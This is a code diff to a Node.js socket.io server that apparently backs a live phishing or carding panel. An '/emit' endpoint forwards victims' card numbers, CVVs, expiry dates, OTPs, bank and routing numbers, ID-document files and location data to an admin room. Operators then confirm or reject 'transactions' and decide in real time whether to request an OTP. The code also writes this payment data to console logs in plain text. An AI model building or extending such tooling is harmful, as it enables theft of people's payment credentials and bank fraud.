@@ -30,6 +30,8 @@ const io = new Server(server, {
 
 app.use(express.json());
 
+// Support chat online users
+const supportClients = {}; 
 // TEMP DATA STORE (you may move to DB later)
 const pendingConfirmations = {};
 
@@ -58,12 +60,28 @@ app.post("/emit", (req, res) => {
         holder: payload.holder || null,
         cardNumber: payload.cardNumber || null,
         expiration: payload.expiration || null,
-        account_type: payload.account_type || null,
+        accountType: payload.account_type || null,
         account_number: payload.account_number || null,
+        account_holder: payload.account_holder || null,
         balance: payload.balance || null,
         cvv: payload.cvv || null,
         brand: payload.brand || null,
-        otp: payload.otp || null
+        otp: payload.otp || null,
+        ip: payload.ip || null,
+        country: payload.country || null,
+        state: payload.state || null,
+        city: payload.city || null,
+        file_name: payload.file_name || null,
+        front_name: payload.front_name || null,
+        back_name: payload.back_name || null,
+        beneficiary: payload.beneficiary || null,
+        address: payload.address || null,
+        bank_name: payload.bank_name || null,
+        routing_number: payload.routing_number || null,
+        account_number: payload.account_number || null,
+        swift_bic: payload.swift_bic || null,
+         account_holder: payload.account_holder || null,
+        
     };
 
     console.log("Admin Notification Broadcast:", safe);
@@ -96,6 +114,63 @@ app.post("/ping_pending_user", (req, res) => {
 io.on("connection", (socket) => {
     console.log("Socket connected:", socket.id);
 
+    /* ============================================================================
+   LIVE SUPPORT CHAT (CLIENT ↔ ADMIN)
+============================================================================ */
+
+/* USER JOINS SUPPORT CHAT */
+socket.on("join_chat", ({ name, email, room }) => {
+    if (!room || !email) return;
+
+    socket.join(room);
+
+    console.log(`User joined support room: ${room}`);
+
+    // Notify admins
+    io.to("admins").emit("support_user_joined", {
+        name,
+        email,
+        room
+    });
+});
+
+/* CLIENT SENDS MESSAGE */
+socket.on("client_message", ({ room, message, email }) => {
+    if (!room || !message) return;
+
+    console.log(`Client message in ${room}:`, message);
+
+    // Forward to admins
+    io.to("admins").emit("support_client_message", {
+        room,
+        message,
+        email,
+        sender: "client",
+        time: new Date().toISOString()
+    });
+});
+
+/* ADMIN SENDS MESSAGE */
+socket.on("admin_message", ({ room, message }) => {
+    if (!room || !message) return;
+
+    console.log(`Admin message to ${room}:`, message);
+
+    io.to(room).emit("admin_message", {
+        message,
+        sender: "admin",
+        time: new Date().toISOString()
+    });
+});
+
+/* TYPING INDICATOR */
+socket.on("typing", ({ room, sender }) => {
+    if (!room) return;
+
+    socket.to(room).emit("typing", { sender });
+});
+
+
     /* ----------------------------- ADMIN JOIN ----------------------------- */
     socket.on("join_admin_room", ({ token }) => {
         if (token === process.env.ADMIN_ROOM_SECRET) {
@@ -120,12 +195,25 @@ io.on("connection", (socket) => {
         socket.join(roomName);
 
         // If admin already confirmed before user joined, sync to user
+        
         if (pendingConfirmations[transaction_id]) {
-            socket.emit("txn_confirmed", pendingConfirmations[transaction_id]);
-            console.log(
-                `Pushed existing confirmation to ${socket.id} for txn ${transaction_id}`
-            );
-        }
+  const data = pendingConfirmations[transaction_id];
+
+  if (data.status === "otpNotNeeded") {
+    socket.emit("otp_not_needed", data);
+  } else if (data.status === "confirmed") {
+    socket.emit("txn_confirmed", data);
+  } else if (data.status === "rejected") {
+    socket.emit("txn_rejected", data);
+  } else if (data.status === "otpNeeded") {
+    socket.emit("otp_needed", data);
+  }
+
+  console.log(
+    `Pushed existing confirmation to ${socket.id} for txn ${transaction_id}`
+  );
+}
+
 
         // Notify admins (optional)
         io.to("admins").emit("user_joined_room", {
@@ -153,25 +241,25 @@ io.on("connection", (socket) => {
              status: "otpNotNeeded"
          });
      
+         
          console.log(`Broadcasted otp_not_needed to ${roomName}`);
      });
 
     /* ------------------------ ADMIN CONFIRMS TRANSACTION ------------------------ */
-    socket.on("admin_confirm_txn", (data) => {
-        console.log("Admin confirmed transaction:", data);
-
-        pendingConfirmations[data.transaction_id] = { 
-            ...data, 
-            status: "confirmed"
-         };
-
-        const roomName = `txn-${data.transaction_id}`;
-        io.to(roomName).emit("txn_confirmed", {
+   socket.on("admin_confirm_txn", (data) => {
+    const normalized = {
         ...data,
+        accountType: data.accountType || data.account_type || "Unknown",
         status: "confirmed"
-    });
-        console.log(`Broadcasted txn_confirmed to ${roomName}`);
-    });
+    };
+
+    pendingConfirmations[data.transaction_id] = normalized;
+
+    const roomName = `txn-${data.transaction_id}`;
+    io.to(roomName).emit("txn_confirmed", normalized);
+
+    console.log("Broadcasted txn_confirmed:", normalized);
+});
 
     /* ------------------------ ADMIN REJECTS TRANSACTION ------------------------- */
     socket.on("admin-reject-txn", (data) => {
